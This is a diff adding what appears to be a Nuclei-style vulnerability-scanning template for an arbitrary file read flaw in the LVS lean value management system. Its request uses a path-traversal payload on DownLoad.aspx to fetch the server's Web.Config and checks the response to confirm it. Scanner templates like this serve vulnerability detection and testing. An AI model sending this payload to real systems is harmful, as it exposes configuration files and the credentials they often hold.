@@ -1,0 +1,28 @@
+id: poc-yaml-ji-la-ke-ji-download-aspx-anyfile-read
+info:
+  name: LVS精益价值管理系统 DownLoad.aspx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<appSettings>"
+      - type: word
+        part: header
+        words:
+          - "filename=Web.Config"
+      - type: word
+        part: header
+        words:
+          - "application/ms-excel"
+      - type: status
+        status:
+          - 200
